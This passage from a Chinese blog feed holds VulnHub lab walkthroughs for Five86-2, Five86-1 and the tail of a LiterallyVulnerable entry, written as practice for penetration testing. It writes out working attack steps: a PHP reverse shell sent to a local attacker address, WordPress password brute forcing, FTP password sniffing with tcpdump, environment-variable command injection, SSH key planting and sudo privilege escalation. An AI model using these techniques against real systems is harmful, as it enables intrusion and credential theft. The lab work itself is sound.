class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>执行后，没有得到预期的结果</p><p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p><p>也就是可以通过改变环境变量的值来控制这个程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure><p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p><p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p><p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure><p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p><p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p><p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p><p>搜索 SUID 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure><p>可以运行 <code>/var/www/html/test.html</code> </p><h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure><p><code>sudo</code> 运行，提权成功</p><p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p><p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p><p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five86-2</title>
      <link href="/2020/03/20/Five86-2/"/>
      <url>/2020/03/20/Five86-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-26</p></blockquote><h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure><p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p><p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p><p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p><p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure><p>尝试枚举爆破，枚举出两个密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure><p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p><p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p><h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure><p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p><p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p><p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure><p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p><p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p><p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p><h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p><p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barneyspooky1FTP：NoWordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephenapollo1FTP：NoWordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barneyspooky1FTP：NoWordPress：OKsu：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephenapollo1FTP：NoWordPress：OKsu：OK&lt;----- 切入点</span><br></pre></td></tr></table></figure><p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p><h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p><p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p><p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p><p>查看相关进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure><p>查看 FTP 监听的网卡：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure><p>抓包，得到密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure><p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p><p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure><p><code>/usr/sbin/service</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure><p>查看可以 <code>sudo</code> 执行的程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure><p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure><p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p><hr><p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p><p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p><p>查看系统正在运行的进程也要加入信息收集里面</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five86-1</title>
      <link href="/2020/03/10/Five86-1/"/>
      <url>/2020/03/10/Five86-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p></blockquote><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal of this challenge is to get root and to read the one and only flag.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86-1 is a VirtualBox VM built on Debian 64 bit, but there shouldn&#39;t be any issues running it on most PCs.</span><br><span class="line"></span><br><span class="line">Five86-1 has been tested successfully on VMWare Player, but if there are any issues running this VM in VMware, have a read through of this.</span><br><span class="line"></span><br><span class="line">It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.</span><br><span class="line"></span><br><span class="line">Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying that, there shouldn&#39;t be any problems, but I feel the need to throw this out there just in case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out to the members of @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I&#39;m also very interested in hearing how people go about solving these challenges, so if you&#39;re up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you&#39;ve DM&#39;d me if you&#39;d prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure><br/><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure><br/><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br/><p>主机存活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><p>扫服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure><br/><hr><br/><p>访问 80 端口，无有价值信息</p><p>例行扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>经访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>搜索相关漏洞，得到远程命令执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure><p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br/><p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p><br/><p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>使用 MSF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>测试发现存在 <code>Python</code> 使用交互式 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure><br/><p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p><br/><p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br/><p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p><p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p><br/><p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>涉及知识的盲区了，特地去查询记录了一下</p><br/><p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><br/><br/><p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p><br/><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br/><p>看目录，得到一个 